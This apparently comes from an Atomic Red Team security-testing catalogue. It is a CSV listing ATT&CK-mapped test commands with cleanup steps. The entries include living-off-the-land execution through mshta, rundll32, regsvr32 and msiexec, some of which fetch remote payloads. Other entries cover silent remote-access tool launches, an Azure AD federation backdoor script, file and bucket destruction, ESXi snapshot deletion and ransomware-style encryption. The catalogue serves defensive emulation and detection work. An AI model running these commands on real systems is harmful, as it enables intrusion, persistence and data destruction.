"File","AtomicTest","Command","Cleanup"
"C:\AtomicRedTeam\atomics\T1218.005\T1218.005.yaml","Invoke HTML Application - Direct download from URI","Invoke-ATHHTMLApplication -HTAUri #{hta_uri} -MSHTAFilePath #{mshta_file_path}",
"C:\AtomicRedTeam\atomics\T1218.005\T1218.005.yaml","Invoke HTML Application - JScript Engine with Rundll32 and Inline Protocol Handler","Invoke-ATHHTMLApplication -ScriptEngine #{script_engine} -InlineProtocolHandler #{protocol_handler} -UseRundll32 -Rundll32FilePath #{rundll32_file_path}",
"C:\AtomicRedTeam\atomics\T1218.005\T1218.005.yaml","Invoke HTML Application - JScript Engine with Inline Protocol Handler","Invoke-ATHHTMLApplication -ScriptEngine #{script_engine} -InlineProtocolHandler #{protocol_handler} -MSHTAFilePath #{mshta_file_path}",
"C:\AtomicRedTeam\atomics\T1218.005\T1218.005.yaml","Invoke HTML Application - Simulate Lateral Movement over UNC Path","Invoke-ATHHTMLApplication -TemplatePE -AsLocalUNCPath -MSHTAFilePath #{mshta_file_path}",
"C:\AtomicRedTeam\atomics\T1218.005\T1218.005.yaml","Mshta used to Execute PowerShell","mshta.exe ""about:<hta:application><script language=""VBScript"">Close(Execute(""CreateObject(""""Wscript.Shell"""").Run%20""""powershell.exe%20-nop%20-Command%20Write-Host%20#{message};Start-Sleep%20-Seconds%20#{seconds_to_sleep}""""""))</script>'""
",
"C:\AtomicRedTeam\atomics\T1218.007\T1218.007.yaml","Msiexec.exe - Execute Local MSI file with embedded JScript","#{msi_exe} /q /#{action} ""#{msi_payload}""
",
"C:\AtomicRedTeam\atomics\T1218.007\T1218.007.yaml","Msiexec.exe - Execute Local MSI file with embedded VBScript","#{msi_exe} /q /#{action} ""#{msi_payload}""
",
"C:\AtomicRedTeam\atomics\T1218.007\T1218.007.yaml","Msiexec.exe - Execute Local MSI file with an embedded DLL","#{msi_exe} /q /#{action} ""#{msi_payload}""
",
"C:\AtomicRedTeam\atomics\T1218.007\T1218.007.yaml","Msiexec.exe - Execute Local MSI file with an embedded EXE","#{msi_exe} /q /#{action} ""#{msi_payload}""
",
"C:\AtomicRedTeam\atomics\T1218.007\T1218.007.yaml","WMI Win32_Product Class - Execute Local MSI file with embedded JScript","Invoke-CimMethod -ClassName Win32_Product -MethodName #{action} -Arguments @{ PackageLocation = '#{msi_payload}' }
",
"C:\AtomicRedTeam\atomics\T1218.007\T1218.007.yaml","WMI Win32_Product Class - Execute Local MSI file with embedded VBScript","Invoke-CimMethod -ClassName Win32_Product -MethodName #{action} -Arguments @{ PackageLocation = '#{msi_payload}' }
",
"C:\AtomicRedTeam\atomics\T1218.007\T1218.007.yaml","WMI Win32_Product Class - Execute Local MSI file with an embedded DLL","Invoke-CimMethod -ClassName Win32_Product -MethodName #{action} -Arguments @{ PackageLocation = '#{msi_payload}' }
",
"C:\AtomicRedTeam\atomics\T1218.007\T1218.007.yaml","WMI Win32_Product Class - Execute Local MSI file with an embedded EXE","Invoke-CimMethod -ClassName Win32_Product -MethodName #{action} -Arguments @{ PackageLocation = '#{msi_payload}' }
",
"C:\AtomicRedTeam\atomics\T1218.007\T1218.007.yaml","Msiexec.exe - Execute the DllRegisterServer function of a DLL","#{msi_exe} /y ""#{dll_payload}""
",
"C:\AtomicRedTeam\atomics\T1218.007\T1218.007.yaml","Msiexec.exe - Execute the DllUnregisterServer function of a DLL","#{msi_exe} /z ""#{dll_payload}""
",
"C:\AtomicRedTeam\atomics\T1218.007\T1218.007.yaml","Msiexec.exe - Execute Remote MSI file","#{msi_exe} /q /i ""#{msi_payload}""
",
"C:\AtomicRedTeam\atomics\T1218.008\T1218.008.yaml","Odbcconf.exe - Execute Arbitrary DLL","odbcconf.exe /S /A {REGSVR ""#{dll_payload}""}
",
"C:\AtomicRedTeam\atomics\T1218.008\T1218.008.yaml","Odbcconf.exe - Load Response File","cd ""#{rsp_file_path}""
odbcconf.exe -f ""#{rsp_file_name}""
",
"C:\AtomicRedTeam\atomics\T1218.009\T1218.009.yaml","Regasm Uninstall Method Call Test","C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /r:System.EnterpriseServices.dll /out:""#{output_file}"" /target:library ""#{source_file}""
C:\Windows\Microsoft.NET\Framework\v4.0.30319\regasm.exe /U #{output_file}
","del #{output_file} >nul 2>&1
"
"C:\AtomicRedTeam\atomics\T1218.009\T1218.009.yaml","Regsvcs Uninstall Method Call Test","$key = 'BwIAAAAkAABSU0EyAAQAAAEAAQBhXtvkSeH85E31z64cAX+X2PWGc6DHP9VaoD13CljtYau9SesUzKVLJdHphY5ppg5clHIGaL7nZbp6qukLH0lLEq/vW979GWzVAgSZaGVCFpuk6p1y69cSr3STlzljJrY76JIjeS4+RhbdWHp99y8QhwRllOC0qu/WxZaffHS2te/PKzIiTuFfcP46qxQoLR8s3QZhAJBnn9TGJkbix8MTgEt7hD1DC2hXv7dKaC531ZWqGXB54OnuvFbD5P2t+vyvZuHNmAy3pX0BDXqwEfoZZ+hiIk1YUDSNOE79zwnpVP1+BN0PK5QCPCS+6zujfRlQpJ+nfHLLicweJ9uT7OG3g/P+JpXGN0/+Hitolufo7Ucjh+WvZAU//dzrGny5stQtTmLxdhZbOsNDJpsqnzwEUfL5+o8OhujBHDm/ZQ0361mVsSVWrmgDPKHGGRx+7FbdgpBEq3m15/4zzg343V9NBwt1+qZU+TSVPU0wRvkWiZRerjmDdehJIboWsx4V8aiWx8FPPngEmNz89tBAQ8zbIrJFfmtYnj1fFmkNu3lglOefcacyYEHPX/tqcBuBIg/cpcDHps/6SGCCciX3tufnEeDMAQjmLku8X4zHcgJx6FpVK7qeEuvyV0OGKvNor9b/WKQHIHjkzG+z6nWHMoMYV5VMTZ0jLM5aZQ6ypwmFZaNmtL6KDzKv8L1YN2TkKjXEoWulXNliBpelsSJyuICplrCTPGGSxPGihT3rpZ9tbLZUefrFnLNiHfVjNi53Yg4='
$Content = [System.Convert]::FromBase64String($key)
Set-Content $env:Temp\key.snk -Value $Content -Encoding Byte
C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /r:System.EnterpriseServices.dll /out:""#{output_file}"" /target:library /keyfile:$env:Temp\key.snk #{source_file}
C:\Windows\Microsoft.NET\Framework\v4.0.30319\regsvcs.exe #{output_file}
","Remove-Item #{output_file} -ErrorAction Ignore | Out-Null
$parentpath = Split-Path -Path ""#{output_file}""
Remove-Item $parentpath\key.snk -ErrorAction Ignore | Out-Null
Remove-Item $parentpath\T1218.009.tlb -ErrorAction Ignore | Out-Null
"
"C:\AtomicRedTeam\atomics\T1218.010\T1218.010.yaml","Regsvr32 local COM scriptlet execution","#{regsvr32path}\#{regsvr32name} /s /u /i:""#{filename}"" scrobj.dll
",
"C:\AtomicRedTeam\atomics\T1218.010\T1218.010.yaml","Regsvr32 remote COM scriptlet execution","#{regsvr32path}\#{regsvr32name} /s /u /i:#{url} scrobj.dll
",
"C:\AtomicRedTeam\atomics\T1218.010\T1218.010.yaml","Regsvr32 local DLL execution","IF ""%PROCESSOR_ARCHITECTURE%""==""AMD64"" (C:\Windows\syswow64\regsvr32.exe /s #{dll_name}) ELSE ( #{regsvr32path}\#{regsvr32name} /s #{dll_name} )
",
"C:\AtomicRedTeam\atomics\T1218.010\T1218.010.yaml","Regsvr32 Registering Non DLL","#{regsvr32path}\#{regsvr32name} /s #{dll_file}
","#{regsvr32path}\#{regsvr32name} /U /s #{dll_file}
"
"C:\AtomicRedTeam\atomics\T1218.010\T1218.010.yaml","Regsvr32 Silent DLL Install Call DllRegisterServer","#{regsvr32path}\#{regsvr32name} /s /i ""#{dll_name}""
",
"C:\AtomicRedTeam\atomics\T1218.011\T1218.011.yaml","Rundll32 execute JavaScript Remote Payload With GetObject","rundll32.exe javascript:""\..\mshtml,RunHTMLApplication "";document.write();GetObject(""script:#{file_url}"").Exec();window.close();
","taskkill /IM notepad.exe /f
"
"C:\AtomicRedTeam\atomics\T1218.011\T1218.011.yaml","Rundll32 execute VBscript command","rundll32 vbscript:""\..\mshtml,RunHTMLApplication ""+String(CreateObject(""WScript.Shell"").Run(""#{command_to_execute}""),0)
",
"C:\AtomicRedTeam\atomics\T1218.011\T1218.011.yaml","Rundll32 execute VBscript command using Ordinal number","rundll32 vbscript:""\..\mshtml,#135 ""+String(CreateObject(""WScript.Shell"").Run(""#{command_to_execute}""),0)
",
"C:\AtomicRedTeam\atomics\T1218.011\T1218.011.yaml","Rundll32 advpack.dll Execution","rundll32.exe advpack.dll,LaunchINFSection ""#{inf_to_execute}"",DefaultInstall_SingleUser,1,
",
"C:\AtomicRedTeam\atomics\T1218.011\T1218.011.yaml","Rundll32 ieadvpack.dll Execution","rundll32.exe ieadvpack.dll,LaunchINFSection ""#{inf_to_execute}"",DefaultInstall_SingleUser,1,
",
"C:\AtomicRedTeam\atomics\T1218.011\T1218.011.yaml","Rundll32 syssetup.dll Execution","rundll32.exe syssetup.dll,SetupInfObjectInstallAction DefaultInstall 128 ""#{inf_to_execute}""
",
"C:\AtomicRedTeam\atomics\T1218.011\T1218.011.yaml","Rundll32 setupapi.dll Execution","rundll32.exe setupapi.dll,InstallHinfSection DefaultInstall 128 ""#{inf_to_execute}""
",
"C:\AtomicRedTeam\atomics\T1218.011\T1218.011.yaml","Launches an executable using Rundll32 and pcwutl.dll","rundll32.exe pcwutl.dll,LaunchApplication #{exe_to_launch}
",
"C:\AtomicRedTeam\atomics\T1218.011\T1218.011.yaml","Execution of non-dll using rundll32.exe","rundll32.exe #{input_file}, StartW
",
"C:\AtomicRedTeam\atomics\T1218.011\T1218.011.yaml","Rundll32 with Ordinal Value","rundll32.exe ""#{input_file}"",#2
",
"C:\AtomicRedTeam\atomics\T1218.011\T1218.011.yaml","Rundll32 with Control_RunDLL","rundll32.exe shell32.dll,Control_RunDLL ""#{input_file}""
",
"C:\AtomicRedTeam\atomics\T1218.011\T1218.011.yaml","Rundll32 with desk.cpl","copy #{exe_to_launch} not_an_scr.scr
rundll32.exe desk.cpl,InstallScreenSaver not_an_scr.scr
","del not_an_scr.scr"
"C:\AtomicRedTeam\atomics\T1218.011\T1218.011.yaml","Running DLL with .init extension and function","rundll32.exe #{dll_file},krnl
",
"C:\AtomicRedTeam\atomics\T1218.011\T1218.011.yaml","Rundll32 execute command via FileProtocolHandler","rundll32.exe url.dll,FileProtocolHandler #{command_to_execute}
",
"C:\AtomicRedTeam\atomics\T1218.011\T1218.011.yaml","Rundll32 execute payload by calling RouteTheCall","rundll32.exe zipfldr.dll,RouteTheCall ""#{exe_to_launch}""",
"C:\AtomicRedTeam\atomics\T1219\T1219.yaml","Ammyy Admin Software Execution","Start-Process ""#{Ammyy_Admin_Path}""
","Stop-Process -Name ""Ammyy"" -force -erroraction silentlycontinue
"
"C:\AtomicRedTeam\atomics\T1219\T1219.yaml","RemotePC Software Execution","Start-Process ""#{RemotePC_Path}""
","Unregister-ScheduledTask -TaskName ""RemotePC"" -Confirm:$False -ErrorAction SilentlyContinue
Unregister-ScheduledTask -TaskName ""RPCServiceHealthCheck"" -Confirm:$False -ErrorAction SilentlyContinue
Unregister-ScheduledTask -TaskName ""ServiceMonitor"" -Confirm:$False -ErrorAction SilentlyContinue
Unregister-ScheduledTask -TaskName ""StartRPCService"" -Confirm:$False -ErrorAction SilentlyContinue      
Stop-Process -Name ""RemotePCPerformance"" -force -erroraction silentlycontinue
Stop-Process -Name ""RPCPerformanceService"" -force -erroraction silentlycontinue
Stop-Process -Name ""RemotePCUIU"" -force -erroraction silentlycontinue
Stop-Process -Name ""RPCDownloader"" -force -erroraction silentlycontinue
Stop-Process -Name ""RemotePCService"" -force -erroraction silentlycontinue
Stop-Process -Name ""RPCService"" -force -erroraction silentlycontinue
"
"C:\AtomicRedTeam\atomics\T1219\T1219.yaml","NetSupport - RAT Execution","Start-Process ""#{NetSupport_Path}"" -ArgumentList ""/S /v/qn""
","Stop-Process -Name ""client32"" -force -erroraction silentlycontinue
"
"C:\AtomicRedTeam\atomics\T1219\T1219.yaml","UltraViewer - RAT Execution","Start-Process -Wait -FilePath ""#{UltraViewer_Path}"" -Argument ""/silent"" -PassThru
Start-Process 'C:\Program Files (x86)\UltraViewer\UltraViewer_Desktop.exe'
","Stop-Process -Name ""UltraViewer_Desktop"" -Force -ErrorAction SilentlyContinue
"
"C:\AtomicRedTeam\atomics\T1219\T1219.yaml","UltraVNC Execution","Start-Process #{UltraVNC_Viewer_Path}
","Stop-Process -Name ""vncviewer"" -force -erroraction silentlycontinue
"
"C:\AtomicRedTeam\atomics\T1219\T1219.yaml","MSP360 Connect Execution","Start-Process #{MSP360_Connect_Path}
","Stop-Process -Name ""Connect"" -force -erroraction silentlycontinue
"
"C:\AtomicRedTeam\atomics\T1219\T1219.yaml","Splashtop Execution","Start-Process ""#{Splashtop_Path}""
","Stop-Process -Name ""strwinclt"" -force -erroraction silentlycontinue
"
"C:\AtomicRedTeam\atomics\T1219\T1219.yaml","Splashtop Streamer Execution","Start-Process -FilePath ""C:Program Files (x86)\Splashtop\Splashtop Remote\Server\#{srserver_exe}""",
"C:\AtomicRedTeam\atomics\T1220\T1220.yaml","MSXSL Bypass using local files","""#{msxsl_exe}"" ""#{xmlfile}"" ""#{xslfile}""
","del ""#{msxsl_exe}"" >nul 2>&1
"
"C:\AtomicRedTeam\atomics\T1220\T1220.yaml","MSXSL Bypass using remote files","""#{msxsl_exe}"" ""#{xmlfile}"" ""#{xslfile}""
","del -Path #{msxsl_exe} >nul 2>&1
"
"C:\AtomicRedTeam\atomics\T1220\T1220.yaml","WMIC bypass using local XSL file","wmic #{wmic_command} /FORMAT:""#{local_xsl_file}""
",
"C:\AtomicRedTeam\atomics\T1220\T1220.yaml","WMIC bypass using remote XSL file","wmic #{wmic_command} /FORMAT:""#{remote_xsl_file}""
",
"C:\AtomicRedTeam\atomics\T1221\T1221.yaml","WINWORD Remote Template Injection","start ""#{docx_file}""
",
"C:\AtomicRedTeam\atomics\T1222.001\T1222.001.yaml","Take ownership using takeown utility","takeown.exe /f #{file_folder_to_own} /r
",
"C:\AtomicRedTeam\atomics\T1222.001\T1222.001.yaml","cacls - Grant permission to specified user or group recursively","icacls.exe #{file_or_folder} /grant #{user_or_group}:F
",
"C:\AtomicRedTeam\atomics\T1222.001\T1222.001.yaml","attrib - Remove read-only attribute","attrib.exe -r #{file_or_folder}\*.* /s
",
"C:\AtomicRedTeam\atomics\T1222.001\T1222.001.yaml","attrib - hide file","mkdir #{file_or_folder} >nul 2>&1
echo T1222.001_attrib1 >> #{file_or_folder}\T1222.001_attrib1.txt
echo T1222.001_attrib2 >> #{file_or_folder}\T1222.001_attrib2.txt
attrib.exe +h #{file_or_folder}\T1222.001_attrib1.txt
attrib.exe +h #{file_or_folder}\T1222.001_attrib2.txt
","del /A:H #{file_or_folder}\T1222.001_attrib*.txt >nul 2>&1
"
"C:\AtomicRedTeam\atomics\T1222.001\T1222.001.yaml","Grant Full Access to folder for Everyone - Ryuk Ransomware Style","icacls ""#{path}"" /grant Everyone:F /T /C /Q","icacls '#{path}' /restore #{file_path} /q >nul 2>&1
"
"C:\AtomicRedTeam\atomics\T1222.001\T1222.001.yaml","SubInAcl Execution","""C:\Program Files (x86)\Windows Resource Kits\Tools\subinacl.exe""",
"C:\AtomicRedTeam\atomics\T1222.002\T1222.002.yaml","chmod - Change file or folder mode (numeric mode)","chmod #{numeric_mode} #{file_or_folder}
",
"C:\AtomicRedTeam\atomics\T1222.002\T1222.002.yaml","chmod - Change file or folder mode (symbolic mode)","chmod #{symbolic_mode} #{file_or_folder}
",
"C:\AtomicRedTeam\atomics\T1222.002\T1222.002.yaml","chmod - Change file or folder mode (numeric mode) recursively","chmod -R #{numeric_mode} #{file_or_folder}
",
"C:\AtomicRedTeam\atomics\T1222.002\T1222.002.yaml","chmod - Change file or folder mode (symbolic mode) recursively","chmod -R #{symbolic_mode} #{file_or_folder}
",
"C:\AtomicRedTeam\atomics\T1222.002\T1222.002.yaml","chown - Change file or folder ownership and group","chown #{owner}:#{group} #{file_or_folder}
",
"C:\AtomicRedTeam\atomics\T1222.002\T1222.002.yaml","chown - Change file or folder ownership and group recursively","chown -R #{owner}:#{group} #{file_or_folder}
",
"C:\AtomicRedTeam\atomics\T1222.002\T1222.002.yaml","chown - Change file or folder mode ownership only","chown #{owner} #{file_or_folder}
",
"C:\AtomicRedTeam\atomics\T1222.002\T1222.002.yaml","chown - Change file or folder ownership recursively","chown -R #{owner} #{file_or_folder}
",
"C:\AtomicRedTeam\atomics\T1222.002\T1222.002.yaml","chattr - Remove immutable file attribute","chattr -i #{file_to_modify}
",
"C:\AtomicRedTeam\atomics\T1222.002\T1222.002.yaml","chflags - Remove immutable file attribute","touch #{file_to_modify}
chflags simmutable #{file_to_modify}
chflags nosimmutable #{file_to_modify}
",
"C:\AtomicRedTeam\atomics\T1222.002\T1222.002.yaml","Chmod through c script","#{compiled_file} /tmp/ T1222002
",
"C:\AtomicRedTeam\atomics\T1222.002\T1222.002.yaml","Chmod through c script (freebsd)","#{compiled_file} /tmp/ T1222002
",
"C:\AtomicRedTeam\atomics\T1222.002\T1222.002.yaml","Chown through c script","sudo #{compiled_file} #{source_file}
",
"C:\AtomicRedTeam\atomics\T1222.002\T1222.002.yaml","Chown through c script (freebsd)","#{compiled_file} #{source_file}
",
"C:\AtomicRedTeam\atomics\T1482\T1482.yaml","Adfind - Enumerate Active Directory OUs","""PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe"" -f (objectcategory=organizationalUnit) #{optional_args}
",
"C:\AtomicRedTeam\atomics\T1482\T1482.yaml","Adfind - Enumerate Active Directory Trusts","""PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe"" #{optional_args} -gcb -sc trustdmp
",
"C:\AtomicRedTeam\atomics\T1482\T1482.yaml","TruffleSnout - Listing AD Infrastructure","""#{trufflesnout_path}"" forest -n #{domain}
""#{trufflesnout_path}"" domain -n #{domain}
",
"C:\AtomicRedTeam\atomics\T1484.002\T1484.002.yaml","Add Federation to Azure AD","Import-Module AzureAD
Import-Module AADInternals

$PWord = ConvertTo-SecureString -String ""#{azure_password}"" -AsPlainText -Force
$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList ""#{azure_username}"", $Pword

try {
  Connect-AzureAD -Credential $Credential -ErrorAction Stop > $null
}
catch {
  Write-Host ""Error: AzureAD could not connect""
  exit 1
}

try {
  $domain = Get-AzureADDomain -Name ""#{domain_name}""
}
catch {
  Write-Host ""Error: domain """"#{domain_name}"""" not found""
  exit 1
}
if (-Not $domain.IsVerified) {
  Write-Host ""Error: domain """"#{domain_name}"""" not verified""
  exit 1
}

if ($domain.AuthenticationType -eq ""Federated"") {
  Write-Host ""Error: domain """"#{domain_name}"""" already federated. Try with a different domain or re-create it before.""
  exit 1
}

$at = Get-AADIntAccessTokenForAADGraph -Credentials $Credential
if (-Not $at) {
  Write-Host ""Error: AADInternals could not connect""
  exit 1
}

$new = ConvertTo-AADIntBackdoor -AccessToken $at -DomainName ""#{domain_name}""
if ($new) {
  Write-Host ""Federation successfully added to Azure AD""
  Write-Host $new
}
else {
  Write-Host ""The federation setup failed""
}

Write-Host ""End of federation configuration.""
","try {
  Import-Module AzureAD -ErrorAction Ignore

  $PWord = ConvertTo-SecureString -String ""#{azure_password}"" -AsPlainText -Force
  $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList ""#{azure_username}"", $Pword
  Connect-AzureAD -Credential $Credential -ErrorAction Ignore > $null

  Remove-AzureADDomain -Name ""#{domain_name}"" -ErrorAction Ignore
} catch {}
"
"C:\AtomicRedTeam\atomics\T1485\T1485.yaml","Windows - Overwrite file with SysInternals SDelete","if (-not (Test-Path ""#{file_to_delete}"")) { New-Item ""#{file_to_delete}"" -Force }
& ""#{sdelete_exe}"" -accepteula ""#{file_to_delete}""
",
"C:\AtomicRedTeam\atomics\T1485\T1485.yaml","FreeBSD/macOS/Linux - Overwrite file with DD","dd of=#{file_to_overwrite} if=#{overwrite_source} count=$(ls -l #{file_to_overwrite} | awk '{print $5}') iflag=count_bytes
",
"C:\AtomicRedTeam\atomics\T1485\T1485.yaml","GCP - Delete Bucket","gcloud config set project #{project_id}
gcloud storage buckets delete gs://#{bucket_name}
","cd ""$PathToAtomicsFolder/T1485/src/T1485-4/""
terraform state rm google_storage_bucket.bucket
terraform destroy -auto-approve
"
"C:\AtomicRedTeam\atomics\T1485\T1485.yaml","ESXi - Delete VM Snapshots","echo """" | ""#{plink_file}"" -batch ""#{vm_host}"" -ssh -l #{vm_user} -pw ""#{vm_pass}"" ""for i in `vim-cmd vmsvc/getallvms | awk 'NR>1 {print $1}'`; do vim-cmd vmsvc/snapshot.removeall $i & done""
",
"C:\AtomicRedTeam\atomics\T1486\T1486.yaml","Encrypt files using gpg (FreeBSD/Linux)","echo ""#{pwd_for_encrypted_file}"" | $which_gpg --batch --yes --passphrase-fd 0 --cipher-algo #{encryption_alg} -o #{encrypted_file_path} -c #{input_file_path}
","rm #{encrypted_file_path}
"
